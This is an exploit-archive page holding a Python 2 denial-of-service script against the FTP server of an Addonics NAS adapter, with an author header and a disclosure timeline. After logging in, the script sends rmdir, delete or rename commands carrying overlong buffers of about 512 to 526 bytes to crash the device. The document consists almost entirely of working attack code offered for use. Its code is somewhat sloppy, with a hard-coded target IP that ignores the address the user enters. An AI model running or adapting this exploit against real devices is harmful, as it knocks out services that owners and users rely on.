Addonics NAS Adapter FTP Remote Denial of Service Exploit
=========================================================



#!/usr/bin/python
######################################################
# Addonics NAS Adapter FTP server DoS
# Tested against NASU2FW41 Loader 1.17
# Coded by Mike Cyr, aka h00die
# Notes: Since the HTTP server was so vulnerable, is
#        this really a suprise?
# Greetz to muts and loganWHD, I tried harder
# http://www.offensive-security.com/offsec101.php turning script kiddies into ninjas daily
# Log: Vendor notification March 25, 2009
#      Vendor response March 26, 2009
#	   Milw0rm release May 1, 2009
######################################################

import socket
import sys

buffer= &#039;a&#039;
counter=1

ip = raw_input("IP: ")
un = raw_input("Username: ")
password = raw_input("Password: ")

print "Vulnerable commands"
print "1. rmdir"
print "2. delete"
print "3. rename"
command = raw_input("Command to crash (#): ")

if command == "1":
	print "fuzzing " + ip + " with command rmdir"
elif command == "2":
	print "fuzzing " + ip + " with command delete"
elif command == "3":
	print "fuzzing " + ip + " with command rename"
else:
	print "your an idiot"
	sys.exit(1)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((&#039;192.168.2.101&#039;,21))
print s.recv(1024)
s.send(&#039;USER &#039; + un + &#039;\r\n&#039;)
print s.recv(1024)
s.send(&#039;PASS &#039; + password + &#039;\r\n&#039;)
print s.recv(1024)
if command == "1":
	while len(buffer) <=512:
		buffer = buffer + &#039;a&#039;
		counter=counter+1
	s.send(&#039;XRMD &#039; + buffer + &#039;\r\n&#039;)
	print &#039;rmdir &#039; + buffer + &#039;\r\n&#039;
elif command == "2":
	while len(buffer) <=523:
		buffer = buffer + &#039;a&#039;
		counter=counter+1
	s.send(&#039;delete &#039; + buffer + &#039;\r\n&#039;)
elif command == "3":
	while len(buffer) <=526:
		buffer = buffer + &#039;a&#039;
		counter=counter+1
	s.send(&#039;RNFR &#039; + buffer + &#039;\r\n&#039;)
	answer=s.recv(1024)
	s.send(&#039;RNTO &#039; + buffer + &#039;\r\n&#039;)
	answer=s.recv(1024)
if (answer == "550 Requested action not taken.\r\n"):
	print "Stack smashed"
else:
	print "fail: " + answer
s.close()



